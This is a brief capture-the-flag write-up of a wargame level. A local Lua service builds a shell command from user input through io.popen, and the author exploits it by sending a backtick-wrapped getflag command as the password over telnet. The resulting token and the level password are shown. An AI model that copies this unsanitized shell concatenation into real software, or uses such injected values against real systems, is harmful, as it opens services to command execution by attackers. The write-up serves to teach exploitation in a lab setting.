`su level11 -> feulo4b72j7edeahuete3no7c`

We have a lua script:

```lua
$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

This script runs on port 5151.

Try to decode the hash, with www.dcode.fr/hash-function, and we get `NotSoEasy` so I think it's not this.

Try to inject a command in `io.popen`:

```bash
$ telnet 127.0.0.1 5151
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Password: `getflag > /tmp/flag`
Erf nope..
Connection closed by foreign host.
$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
